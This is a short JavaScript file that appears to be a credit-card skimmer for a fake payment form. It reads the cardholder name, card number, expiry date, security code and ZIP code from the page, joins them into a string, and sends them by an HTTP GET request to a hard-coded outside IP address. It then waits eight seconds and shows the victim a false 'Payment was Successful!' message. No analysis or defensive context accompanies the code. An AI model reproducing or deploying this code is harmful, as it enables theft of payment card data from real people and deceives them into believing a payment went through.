function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
}
function myFunction() {
 
      var name = document.getElementById("NameOnCard").value;  
       name=name.replace(" ","_");
       
      var CCnumber = document.getElementById("CreditCardNumber").value;  
        CCnumber=CCnumber.replace(" ","");
       
       
      var Exp = document.getElementById("ExpiryDate").value;  
      Exp=Exp.replace(" ","");
          Exp=Exp.replace("/","-");
      
       
       
      var Sec = document.getElementById("SecurityCode").value;  
        Sec =Sec.replace(" ","");
       
       
      var Zip = document.getElementById("ZIPCode").value;  
     Zip=Zip.replace(" ","");
      
      var urlx = name + "_" + CCnumber + "_" + Exp + "_" + Sec + "_" + Zip 
      
       
       
    var urlxx = 'http://52.59.172.11:8090';
     var urLL = urlxx + urlx
 var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
         if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", urLL, true); // true for asynchronous 
    xmlHttp.send(null);

        wait(8000);
      alert("Thank you! Payment was Successful!");
}